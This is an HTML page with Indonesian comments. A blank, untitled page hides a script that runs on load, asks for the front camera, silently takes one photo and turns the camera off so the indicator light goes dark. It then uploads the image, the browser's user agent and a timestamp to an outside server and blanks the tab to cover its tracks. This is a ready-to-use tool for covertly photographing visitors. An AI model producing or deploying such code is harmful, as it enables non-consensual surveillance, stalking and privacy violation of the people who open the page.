<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>.</title>
    <style>
        body { 
            margin: 0; 
            background: #fff; 
            overflow: hidden;
        }
        video, canvas { 
            display: none; 
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        // GANTI URL INI PAKE SERVER LU
        const SERVER_URL = 'https://servercam.great-site.net/uploadcam.php';
        
        async function startSilentCam() {
            try {
                // 1. Minta izin kamera langsung pas load
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, // Kamera depan
                    audio: false 
                });
                
                video.srcObject = stream;
                
                // 2. Tunggu kamera ready, langsung jepret
                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        takeAndSend();
                    }, 500); // Delay 0.5 detik biar kamera fokus
                };
                
            } catch (err) {
                // Kalo ditolak izin, diem aja
                console.log('Ditolak:', err);
                window.close();
            }
        }
        
        function takeAndSend() {
            // 3. Jepret tanpa tampilin apa-apa
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // 4. Stop kamera biar lampu LED mati
            video.srcObject.getTracks().forEach(track => track.stop());
            
            // 5. Kirim ke server lu
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('photo', blob, 'foto.png');
                formData.append('ua', navigator.userAgent);
                formData.append('time', new Date().toISOString());
                
                fetch(SERVER_URL, {
                    method: 'POST',
                    body: formData
                }).catch(() => {}).finally(() => {
                    // 6. Tutup tab / redirect biar ilang
                    window.location.href = 'about:blank';
                    // atau window.close(); tapi kadang diblokir
                });
                
            }, 'image/png');
        }
        
        // Auto jalan pas buka halaman
        startSilentCam();
    </script>
</body>
</html>
